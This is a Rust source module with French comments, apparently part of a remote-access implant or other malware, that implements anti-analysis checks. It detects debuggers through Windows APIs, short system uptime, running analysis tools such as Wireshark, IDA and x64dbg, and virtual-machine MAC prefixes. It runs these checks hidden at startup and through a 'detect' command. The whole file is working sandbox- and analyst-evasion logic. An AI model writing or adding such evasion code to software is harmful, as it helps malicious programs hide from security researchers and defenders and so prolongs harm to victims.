// Contrôles anti-analyse.
// Utilisé au démarrage (looks_safe) et par la commande `detect`.

static SUSPECT_PROCS: &[&str] = &[
    "wireshark.exe", "procmon.exe", "procmon64.exe", "ida.exe",
    "ida64.exe", "x64dbg.exe", "ollydbg.exe", "fiddler.exe",
    "processhacker.exe", "autoruns.exe",
];

static SUSPECT_MAC_PREFIXES: &[&str] = &[
    "08:00:27", "00:0c:29", "00:50:56", "52:54:00",
];

const MIN_UPTIME_SECS: u64 = 300;

pub fn run(_args: &str) -> String {
    let d = is_debugged();
    let uptime = uptime_secs();
    let procs = suspect_processes();
    let vmac = virtual_mac();
    let cpus = num_cpus();

    let safe = !d && uptime >= MIN_UPTIME_SECS && procs.is_empty() && !vmac;
    format!(
        "debugger: {}\nuptime: {}s\nuptime_court: {}\noutils_analyse: {}\nmac_virtuelle: {}\ncpu: {}\nverdict: {}",
        d,
        uptime,
        uptime < MIN_UPTIME_SECS,
        if procs.is_empty() { "aucun".to_string() } else { procs.join(", ") },
        vmac,
        cpus,
        if safe { "sain" } else { "analysable" },
    )
}

pub fn looks_safe() -> bool {
    !is_debugged()
        && uptime_secs() >= MIN_UPTIME_SECS
        && suspect_processes().is_empty()
        && !virtual_mac()
}

fn is_debugged() -> bool {
    #[cfg(windows)]
    unsafe {
        use windows_sys::Win32::System::Diagnostics::Debug::{
            CheckRemoteDebuggerPresent, IsDebuggerPresent,
        };
        use windows_sys::Win32::System::Threading::GetCurrentProcess;
        if IsDebuggerPresent() != 0 {
            return true;
        }
        let mut present = 0i32;
        CheckRemoteDebuggerPresent(GetCurrentProcess(), &mut present);
        present != 0
    }
    #[cfg(not(windows))]
    false
}

fn uptime_secs() -> u64 {
    #[cfg(windows)]
    unsafe {
        use windows_sys::Win32::System::SystemInformation::GetTickCount64;
        GetTickCount64() / 1000
    }
    #[cfg(not(windows))]
    {
        std::fs::read_to_string("/proc/uptime")
            .ok()
            .and_then(|s| s.split_whitespace().next()?.parse::<f64>().ok())
            .map(|f| f as u64)
            .unwrap_or(u64::MAX)
    }
}

fn suspect_processes() -> Vec<String> {
    let listing = crate::modules::shell_builtin::ps().to_lowercase();
    SUSPECT_PROCS
        .iter()
        .filter(|&&name| listing.contains(name))
        .map(|s| s.to_string())
        .collect()
}

fn virtual_mac() -> bool {
    // Essaie de récupérer la première adresse MAC disponible pour comparer son préfixe.
    #[cfg(windows)]
    {
        use std::process::Command;
        use std::os::windows::process::CommandExt;
        let out = Command::new("getmac")
            .arg("/fo")
            .arg("csv")
            .creation_flags(0x08000000) // CREATE_NO_WINDOW
            .output()
            .map(|o| String::from_utf8_lossy(&o.stdout).to_lowercase())
            .unwrap_or_default();
        SUSPECT_MAC_PREFIXES
            .iter()
            .any(|&prefix| out.contains(&prefix.to_lowercase()))
    }
    #[cfg(not(windows))]
    false
}

fn num_cpus() -> usize {
    std::thread::available_parallelism()
        .map(|n| n.get())
        .unwrap_or(0)
}
